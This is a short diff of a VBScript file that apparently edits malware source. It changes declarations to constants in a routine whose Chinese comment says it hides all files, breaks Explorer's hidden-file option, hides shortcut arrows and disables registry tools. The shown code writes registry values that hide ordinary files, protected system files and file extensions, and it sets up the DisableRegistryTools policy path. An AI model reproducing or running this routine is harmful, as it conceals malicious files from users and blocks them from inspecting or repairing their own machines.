@@ -1,11 +1,11 @@
 Call HideAllFile()
 
 Sub HideAllFile() '隐藏所有文件，破坏Explorer隐藏选项，隐藏快捷方式小箭头，禁用注册表工具
-	NoHiddenRegPath = "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\NOHIDDEN\CheckedValue" 	
-	ShowAllRegPath = "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL\CheckedValue"		
-	ShowShortCurIconRegPath = "HKCR\lnkfile\IsShortcut"
-	RegToolForbidRegPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools"
-	HideFileRegRootPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\"
+	Const NoHiddenRegPath = "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\NOHIDDEN\CheckedValue" 	
+	Const ShowAllRegPath = "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL\CheckedValue"		
+	Const ShowShortCurIconRegPath = "HKCR\lnkfile\IsShortcut"
+	Const RegToolForbidRegPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools"
+	Const HideFileRegRootPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\"
 	Call WriteReg(HideFileRegRootPath & "Hidden", 2, "REG_DWORD") 			'普通文件 			1-显示 2-隐藏
 	Call WriteReg(HideFileRegRootPath & "ShowSuperHidden", 0, "REG_DWORD") 	'受系统保护的文件 	1-显示 0-隐藏
 	Call WriteReg(HideFileRegRootPath & "HideFileExt", 1, "REG_DWORD") 		'文件扩展名			0-显示 1-隐藏
